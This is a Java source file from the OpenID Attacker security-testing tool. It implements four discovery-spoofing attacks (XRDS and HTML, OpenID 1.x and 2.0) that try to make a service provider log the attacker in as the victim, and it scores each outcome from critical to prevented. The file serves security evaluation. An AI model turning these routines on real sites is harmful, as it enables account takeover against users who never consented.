/*
 * OpenID Attacker
 * (C) 2015 Christian Mainka & Christian Koßmann
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.sso.openid.attacker.evaluation.attack;

import org.apache.commons.lang3.SerializationUtils;
import wsattacker.sso.openid.attacker.config.OpenIdServerConfiguration;
import wsattacker.sso.openid.attacker.discovery.html.HtmlDiscoveryConfiguration;
import wsattacker.sso.openid.attacker.discovery.xrds.OpenIdVersion;
import wsattacker.sso.openid.attacker.discovery.xrds.XrdsConfiguration;
import wsattacker.sso.openid.attacker.evaluation.LoginResult;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Interpretation;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Result;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider.User;

public class DiscoverySpoofingAttack extends AbstractAttack {
    
    private HtmlDiscoveryConfiguration htmlConfigCopy;
    private XrdsConfiguration xrdsConfigCopy;

    public DiscoverySpoofingAttack(ServiceProvider serviceProvider) {
        super(serviceProvider);
    }

    @Override
    protected void beforeAttack() {
        super.beforeAttack();
            
        // copy of HTML and XRDS Discovery information by serialization
        htmlConfigCopy = SerializationUtils.clone(serverController.getConfig().getHtmlConfiguration());
        xrdsConfigCopy = SerializationUtils.clone(serverController.getConfig().getXrdsConfiguration());    
    }

    @Override
    protected void afterAttack() {
        super.afterAttack();
        
        // reset HTML and XRDS Discovery information
        serverController.getConfig().setHtmlConfiguration(htmlConfigCopy);
        serverController.getConfig().setXrdsConfiguration(xrdsConfigCopy);
    }
    
    @Attack(number = 0)
    private AttackResult performXrdsDiscoverySpoofingAttackWithOpenId2() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        
        // XRDS Discovery Spoofing - OpenID 2.0
        XrdsConfiguration xrdsConfiguration = serverController.getConfig().getXrdsConfiguration();
        xrdsConfiguration.setOpenIdVersion(OpenIdVersion.VERSION_20_CLAIMED_IDENTIFIER_ELEMENT);
        xrdsConfiguration.setIncludeIdentity(true);
        xrdsConfiguration.setIdentity(serviceProvider.getVictimOpenId());
        
        HtmlDiscoveryConfiguration htmlConfiguration = serverController.getConfig().getHtmlConfiguration();
        htmlConfiguration.setOpenidServer(false);
        htmlConfiguration.setOpenId2Provider(false);
        htmlConfiguration.setIncludeIdentity(false);
        htmlConfiguration.setIdentity(serviceProvider.getAttackerOpenId() + "?xrds");
        htmlConfiguration.setIncludeXrdsHttpHeader(true);
        
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        
        boolean success = loginResult.getAuthenticatedUser() == User.VICTIM;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        if (!loginResult.hasXrdsDiscovery()) {
            result = Result.NOT_DETECTABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        return new AttackResult("XRDS Discovery Spoofing - OpenID 2.0", loginResult, result, interpretation);
    }
    
    @Attack(number = 1)
    private AttackResult performXrdsDiscoverySpoofingAttackWithOpenId1() {
        // XRDS Discovery Spoofing - OpenID 1.0
        XrdsConfiguration xrdsConfiguration = serverController.getConfig().getXrdsConfiguration();
        xrdsConfiguration.setOpenIdVersion(OpenIdVersion.VERSION_11);
        xrdsConfiguration.setIncludeIdentity(true);
        xrdsConfiguration.setIdentity(serviceProvider.getVictimOpenId());
        
        HtmlDiscoveryConfiguration htmlConfiguration = serverController.getConfig().getHtmlConfiguration();
        htmlConfiguration.setOpenidServer(false);
        htmlConfiguration.setOpenId2Provider(false);
        htmlConfiguration.setIncludeIdentity(false);
        htmlConfiguration.setIdentity(serviceProvider.getAttackerOpenId() + "?xrds");
        htmlConfiguration.setIncludeXrdsHttpHeader(true);
        
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        
        boolean success = loginResult.getAuthenticatedUser() == User.VICTIM;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        if (!loginResult.hasXrdsDiscovery()) {
            result = Result.NOT_DETECTABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        return new AttackResult("XRDS Discovery Spoofing - OpenID 1.1", loginResult, result, interpretation);
    }
    
    @Attack(number = 2)
    private AttackResult performHtmlDiscoverySpoofingAttackWithOpenId2() {
        // HTML Discovery Spoofing - OpenID 2.0
        HtmlDiscoveryConfiguration htmlConfiguration = serverController.getConfig().getHtmlConfiguration();
        htmlConfiguration.setOpenidServer(false);
        htmlConfiguration.setOpenId2Provider(true);
        htmlConfiguration.setIncludeXrdsHttpHeader(false);
        
        htmlConfiguration.setIncludeIdentity(true);
        htmlConfiguration.setIdentity(serviceProvider.getVictimOpenId());
        
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        
        boolean success = loginResult.getAuthenticatedUser() == User.VICTIM;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        if (!loginResult.hasHtmlDiscovery()) {
            result = Result.NOT_DETECTABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        return new AttackResult("HTML Discovery Spoofing - OpenID 2.0", loginResult, result, interpretation);
    }
    
    @Attack(number = 3)
    private AttackResult performHtmlDiscoverySpoofingAttackWithOpenId1() {
        // HTML Discovery Spoofing - OpenID 1.0
        HtmlDiscoveryConfiguration htmlConfiguration = serverController.getConfig().getHtmlConfiguration();
        htmlConfiguration.setOpenidServer(true);
        htmlConfiguration.setOpenId2Provider(false);
        htmlConfiguration.setIncludeXrdsHttpHeader(false);
        
        htmlConfiguration.setIncludeIdentity(true);
        htmlConfiguration.setIdentity(serviceProvider.getVictimOpenId());
        
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        
        boolean success = loginResult.getAuthenticatedUser() == User.VICTIM;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        if (!loginResult.hasHtmlDiscovery()) {
            result = Result.NOT_DETECTABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        return new AttackResult("HTML Discovery Spoofing - OpenID 1.0", loginResult, result, interpretation);
    }       
}
